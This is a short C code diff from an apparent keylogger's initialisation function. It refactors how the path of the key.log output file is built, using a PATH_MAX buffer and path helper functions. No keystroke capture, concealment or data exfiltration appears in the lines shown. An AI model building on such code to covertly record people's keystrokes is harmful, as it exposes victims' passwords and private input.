@@ -332,11 +332,10 @@ int init_keylogging(const char input[], struct keyboardInfo* kbd, struct configI
 
     // create keylog file
     {
-        const char file[] = { "/key.log" };
-        char path[sizeof(config->logpath) + sizeof(file)];
+        char path[PATH_MAX];
 
-        strcpy_s(path, sizeof(path), config->logpath);
-        strcat_s(path, sizeof(path), file);
+        pathcpy(path, config->logpath);
+        pathcat(path, "/key.log");
 
         kbd->outfd = open(path, O_WRONLY | O_APPEND | O_CREAT | O_NOCTTY, S_IRUSR | S_IWUSR);
         if (kbd->outfd < 0) {
